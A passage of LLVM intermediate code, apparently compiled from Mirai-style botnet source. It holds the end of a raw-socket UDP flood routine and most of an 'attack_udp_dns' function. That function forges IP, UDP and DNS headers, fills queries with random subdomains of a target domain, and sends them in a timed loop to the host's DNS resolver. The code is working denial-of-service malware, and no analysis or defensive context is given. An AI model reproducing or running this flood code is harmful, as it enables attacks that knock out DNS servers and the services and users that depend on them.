  %143 = load i32, i32* %142, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 9
  store i32 %143, i32* %145, align 4
  %146 = load i16, i16* %18, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #6
  %148 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 0
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %19, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #6
  %152 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %153 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %152, i32 0, i32 1
  store i16 %151, i16* %153, align 2
  %154 = load i32, i32* %21, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 12, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #6
  %159 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i8*, i8** %25, align 8
  %162 = bitcast i8* %161 to i32*
  store i32 -1, i32* %162, align 4
  %163 = load i8*, i8** %25, align 8
  %164 = getelementptr inbounds i8, i8* %163, i64 4
  store i8* %164, i8** %25, align 8
  %165 = load i8*, i8** %25, align 8
  %166 = load i8*, i8** %20, align 8
  %167 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %165, i8* %166, i32 %167)
  br label %168

168:                                              ; preds = %132
  %169 = load i32, i32* %11, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %11, align 4
  br label %76, !llvm.loop !9

171:                                              ; preds = %76
  br label %172

172:                                              ; preds = %171, %301
  store i32 0, i32* %11, align 4
  br label %173

173:                                              ; preds = %292, %172
  %174 = load i32, i32* %11, align 4
  %175 = load i8, i8* %7, align 1
  %176 = zext i8 %175 to i32
  %177 = icmp slt i32 %174, %176
  br i1 %177, label %178, label %295

178:                                              ; preds = %173
  %179 = load i8**, i8*** %13, align 8
  %180 = load i32, i32* %11, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8*, i8** %179, i64 %181
  %183 = load i8*, i8** %182, align 8
  store i8* %183, i8** %26, align 8
  %184 = load i8*, i8** %26, align 8
  %185 = bitcast i8* %184 to %struct.iphdr*
  store %struct.iphdr* %185, %struct.iphdr** %27, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i64 1
  %188 = bitcast %struct.iphdr* %187 to %struct.udphdr*
  store %struct.udphdr* %188, %struct.udphdr** %28, align 8
  %189 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %195, 32
  br i1 %196, label %197, label %218

197:                                              ; preds = %178
  %198 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %199 = load i32, i32* %11, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = call i32 @ntohl(i32 %203) #6
  %205 = call i32 @rand_next()
  %206 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 2
  %211 = load i8, i8* %210, align 4
  %212 = zext i8 %211 to i32
  %213 = lshr i32 %205, %212
  %214 = add i32 %204, %213
  %215 = call i32 @htonl(i32 %214) #6
  %216 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 9
  store i32 %215, i32* %217, align 4
  br label %218

218:                                              ; preds = %197, %178
  %219 = load i16, i16* %15, align 2
  %220 = zext i16 %219 to i32
  %221 = icmp eq i32 %220, 65535
  br i1 %221, label %222, label %227

222:                                              ; preds = %218
  %223 = call i32 @rand_next()
  %224 = trunc i32 %223 to i16
  %225 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 3
  store i16 %224, i16* %226, align 4
  br label %227

227:                                              ; preds = %222, %218
  %228 = load i16, i16* %18, align 2
  %229 = zext i16 %228 to i32
  %230 = icmp eq i32 %229, 65535
  br i1 %230, label %231, label %236

231:                                              ; preds = %227
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  br label %236

236:                                              ; preds = %231, %227
  %237 = load i16, i16* %19, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  br i1 %239, label %240, label %245

240:                                              ; preds = %236
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  br label %245

245:                                              ; preds = %240, %236
  %246 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %249 = bitcast %struct.iphdr* %248 to i16*
  %250 = call zeroext i16 @checksum_generic(i16* %249, i32 20)
  %251 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 7
  store i16 %250, i16* %252, align 2
  %253 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 3
  store i16 0, i16* %254, align 2
  %255 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %256 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %257 = bitcast %struct.udphdr* %256 to i8*
  %258 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  %260 = load i16, i16* %259, align 2
  %261 = load i32, i32* %21, align 4
  %262 = sext i32 %261 to i64
  %263 = add i64 12, %262
  %264 = trunc i64 %263 to i32
  %265 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %255, i8* %257, i16 zeroext %260, i32 %264)
  %266 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %267 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %266, i32 0, i32 3
  store i16 %265, i16* %267, align 2
  %268 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %269 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %268, i32 0, i32 1
  %270 = load i16, i16* %269, align 2
  %271 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %272 = load i32, i32* %11, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %273
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %274, i32 0, i32 0
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %275, i32 0, i32 1
  store i16 %270, i16* %276, align 2
  %277 = load i32, i32* %12, align 4
  %278 = load i8*, i8** %26, align 8
  %279 = load i32, i32* %21, align 4
  %280 = sext i32 %279 to i64
  %281 = add i64 32, %280
  %282 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %283 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %284 = load i32, i32* %11, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %285
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i32 0, i32 0
  %288 = bitcast %struct.sockaddr_in* %287 to %struct.sockaddr*
  store %struct.sockaddr* %288, %struct.sockaddr** %282, align 8
  %289 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %290 = load %struct.sockaddr*, %struct.sockaddr** %289, align 8
  %291 = call i64 @sendto(i32 %277, i8* %278, i64 %281, i32 16384, %struct.sockaddr* %290, i32 16)
  br label %292

292:                                              ; preds = %245
  %293 = load i32, i32* %11, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %11, align 4
  br label %173, !llvm.loop !10

295:                                              ; preds = %173
  %296 = call i64 @time(i64* null) #5
  %297 = load i32, i32* %22, align 4
  %298 = sext i32 %297 to i64
  %299 = icmp sgt i64 %296, %298
  br i1 %299, label %300, label %301

300:                                              ; preds = %295
  br label %302

301:                                              ; preds = %295
  br label %172

302:                                              ; preds = %66, %72, %300
  ret void
}

declare void @table_unlock_val(i8 zeroext) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare void @util_memcpy(i8*, i8*, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_udp_dns(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.dns_question*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias align 16 i8* @calloc(i64 %42, i64 8) #5
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #5
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add nsw i64 %81, %83
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %25, align 4
  %86 = load i8*, i8** %22, align 8
  %87 = icmp eq i8* %86, null
  br i1 %87, label %88, label %89

88:                                               ; preds = %5
  br label %414

89:                                               ; preds = %5
  %90 = load i8*, i8** %22, align 8
  %91 = call i32 @util_strlen(i8* %90)
  store i32 %91, i32* %23, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

94:                                               ; preds = %89
  br label %414

95:                                               ; preds = %89
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #5
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

100:                                              ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  br label %414

103:                                              ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

104:                                              ; preds = %265, %103
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %268

109:                                              ; preds = %104
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %110 = call noalias align 16 i8* @calloc(i64 600, i64 1) #5
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %29, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.udphdr*
  store %struct.udphdr* %123, %struct.udphdr** %30, align 8
  %124 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %125 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %124, i64 1
  %126 = bitcast %struct.udphdr* %125 to %struct.dnshdr*
  store %struct.dnshdr* %126, %struct.dnshdr** %31, align 8
  %127 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %128 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %127, i64 1
  %129 = bitcast %struct.dnshdr* %128 to i8*
  store i8* %129, i8** %32, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, 15
  %134 = or i8 %133, 64
  store i8 %134, i8* %131, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = and i8 %137, -16
  %139 = or i8 %138, 5
  store i8 %139, i8* %136, align 4
  %140 = load i8, i8* %14, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i8, i8* %21, align 1
  %144 = zext i8 %143 to i64
  %145 = add i64 41, %144
  %146 = add i64 %145, 2
  %147 = load i32, i32* %23, align 4
  %148 = sext i32 %147 to i64
  %149 = add i64 %146, %148
  %150 = add i64 %149, 4
  %151 = trunc i64 %150 to i16
  %152 = call zeroext i16 @htons(i16 zeroext %151) #6
  %153 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %15, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #6
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %16, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %17, align 1
  %163 = icmp ne i8 %162, 0
  br i1 %163, label %164, label %168

164:                                              ; preds = %109
  %165 = call zeroext i16 @htons(i16 zeroext 16384) #6
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 4
  store i16 %165, i16* %167, align 2
  br label %168

168:                                              ; preds = %164, %109
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 6
  store i8 17, i8* %170, align 1
  %171 = load i32, i32* @LOCAL_ADDR, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 8
  store i32 %171, i32* %173, align 4
  %174 = load i32, i32* %24, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 9
  store i32 %174, i32* %176, align 4
  %177 = load i16, i16* %18, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #6
  %179 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %180 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %179, i32 0, i32 0
  store i16 %178, i16* %180, align 2
  %181 = load i16, i16* %19, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #6
  %183 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 1
  store i16 %182, i16* %184, align 2
  %185 = load i8, i8* %21, align 1
  %186 = zext i8 %185 to i64
  %187 = add i64 21, %186
  %188 = add i64 %187, 2
  %189 = load i32, i32* %23, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %188, %190
  %192 = add i64 %191, 4
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #6
  %195 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %20, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #6
  %199 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %200 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %199, i32 0, i32 0
  store i16 %198, i16* %200, align 2
  %201 = call zeroext i16 @htons(i16 zeroext 256) #6
  %202 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %203 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext 1) #6
  %205 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %206 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %205, i32 0, i32 2
  store i16 %204, i16* %206, align 2
  %207 = load i8, i8* %21, align 1
  %208 = load i8*, i8** %32, align 8
  %209 = getelementptr inbounds i8, i8* %208, i32 1
  store i8* %209, i8** %32, align 8
  store i8 %207, i8* %208, align 1
  %210 = load i8, i8* %21, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %32, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %32, align 8
  %215 = load i8*, i8** %32, align 8
  store i8* %215, i8** %33, align 8
  %216 = load i8*, i8** %32, align 8
  %217 = getelementptr inbounds i8, i8* %216, i64 1
  %218 = load i8*, i8** %22, align 8
  %219 = load i32, i32* %23, align 4
  %220 = add nsw i32 %219, 1
  call void @util_memcpy(i8* %217, i8* %218, i32 %220)
  store i32 0, i32* %26, align 4
  br label %221

221:                                              ; preds = %247, %168
  %222 = load i32, i32* %26, align 4
  %223 = load i32, i32* %23, align 4
  %224 = icmp slt i32 %222, %223
  br i1 %224, label %225, label %250

225:                                              ; preds = %221
  %226 = load i8*, i8** %22, align 8
  %227 = load i32, i32* %26, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8, i8* %226, i64 %228
  %230 = load i8, i8* %229, align 1
  %231 = sext i8 %230 to i32
  %232 = icmp eq i32 %231, 46
  br i1 %232, label %233, label %243

233:                                              ; preds = %225
  %234 = load i8, i8* %27, align 1
  %235 = load i8*, i8** %33, align 8
  store i8 %234, i8* %235, align 1
  store i8 0, i8* %27, align 1
  %236 = load i8, i8* %28, align 1
  %237 = add i8 %236, 1
  store i8 %237, i8* %28, align 1
  %238 = load i8*, i8** %32, align 8
  %239 = load i32, i32* %26, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8, i8* %238, i64 %240
  %242 = getelementptr inbounds i8, i8* %241, i64 1
  store i8* %242, i8** %33, align 8
  br label %246

243:                                              ; preds = %225
  %244 = load i8, i8* %27, align 1
  %245 = add i8 %244, 1
  store i8 %245, i8* %27, align 1
  br label %246

246:                                              ; preds = %243, %233
  br label %247

247:                                              ; preds = %246
  %248 = load i32, i32* %26, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %26, align 4
  br label %221, !llvm.loop !11

250:                                              ; preds = %221
  %251 = load i8, i8* %27, align 1
  %252 = load i8*, i8** %33, align 8
  store i8 %251, i8* %252, align 1
  %253 = load i8*, i8** %32, align 8
  %254 = load i32, i32* %23, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = getelementptr inbounds i8, i8* %256, i64 2
  %258 = bitcast i8* %257 to %struct.dns_question*
  store %struct.dns_question* %258, %struct.dns_question** %34, align 8
  %259 = call zeroext i16 @htons(i16 zeroext 1) #6
  %260 = load %struct.dns_question*, %struct.dns_question** %34, align 8
  %261 = getelementptr inbounds %struct.dns_question, %struct.dns_question* %260, i32 0, i32 0
  store i16 %259, i16* %261, align 2
  %262 = call zeroext i16 @htons(i16 zeroext 1) #6
  %263 = load %struct.dns_question*, %struct.dns_question** %34, align 8
  %264 = getelementptr inbounds %struct.dns_question, %struct.dns_question* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  br label %265

265:                                              ; preds = %250
  %266 = load i32, i32* %11, align 4
  %267 = add nsw i32 %266, 1
  store i32 %267, i32* %11, align 4
  br label %104, !llvm.loop !12

268:                                              ; preds = %104
  br label %269

269:                                              ; preds = %268, %413
  store i32 0, i32* %11, align 4
  br label %270

270:                                              ; preds = %404, %269
  %271 = load i32, i32* %11, align 4
  %272 = load i8, i8* %7, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp slt i32 %271, %273
  br i1 %274, label %275, label %407

275:                                              ; preds = %270
  %276 = load i8**, i8*** %13, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8*, i8** %276, i64 %278
  %280 = load i8*, i8** %279, align 8
  store i8* %280, i8** %35, align 8
  %281 = load i8*, i8** %35, align 8
  %282 = bitcast i8* %281 to %struct.iphdr*
  store %struct.iphdr* %282, %struct.iphdr** %36, align 8
  %283 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i64 1
  %285 = bitcast %struct.iphdr* %284 to %struct.udphdr*
  store %struct.udphdr* %285, %struct.udphdr** %37, align 8
  %286 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i64 1
  %288 = bitcast %struct.udphdr* %287 to %struct.dnshdr*
  store %struct.dnshdr* %288, %struct.dnshdr** %38, align 8
  %289 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %290 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %289, i64 1
  %291 = bitcast %struct.dnshdr* %290 to i8*
  %292 = getelementptr inbounds i8, i8* %291, i64 1
  store i8* %292, i8** %39, align 8
  %293 = load i16, i16* %15, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp eq i32 %294, 65535
  br i1 %295, label %296, label %302

296:                                              ; preds = %275
  %297 = call i32 @rand_next()
  %298 = and i32 %297, 65535
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  br label %302

302:                                              ; preds = %296, %275
  %303 = load i16, i16* %18, align 2
  %304 = zext i16 %303 to i32
  %305 = icmp eq i32 %304, 65535
  br i1 %305, label %306, label %312

306:                                              ; preds = %302
  %307 = call i32 @rand_next()
  %308 = and i32 %307, 65535
  %309 = trunc i32 %308 to i16
  %310 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 0
  store i16 %309, i16* %311, align 2
  br label %312

312:                                              ; preds = %306, %302
  %313 = load i16, i16* %19, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %322

316:                                              ; preds = %312
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 1
  store i16 %319, i16* %321, align 2
  br label %322

322:                                              ; preds = %316, %312
  %323 = load i16, i16* %20, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  br i1 %325, label %326, label %332

326:                                              ; preds = %322
  %327 = call i32 @rand_next()
  %328 = and i32 %327, 65535
  %329 = trunc i32 %328 to i16
  %330 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %331 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %330, i32 0, i32 0
  store i16 %329, i16* %331, align 2
  br label %332

332:                                              ; preds = %326, %322
  %333 = load i8*, i8** %39, align 8
  %334 = load i8, i8* %21, align 1
  %335 = zext i8 %334 to i32
  call void @rand_alphastr(i8* %333, i32 %335)
  %336 = load i8*, i8** %39, align 8
  %337 = load i8, i8* %21, align 1
  %338 = zext i8 %337 to i64
  %339 = getelementptr inbounds i8, i8* %336, i64 %338
  store i8 0, i8* %339, align 1
  %340 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 7
  store i16 0, i16* %341, align 2
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = bitcast %struct.iphdr* %342 to i16*
  %344 = call zeroext i16 @checksum_generic(i16* %343, i32 20)
  %345 = load %struct.iphdr*, %struct.iphdr** %36, align 8
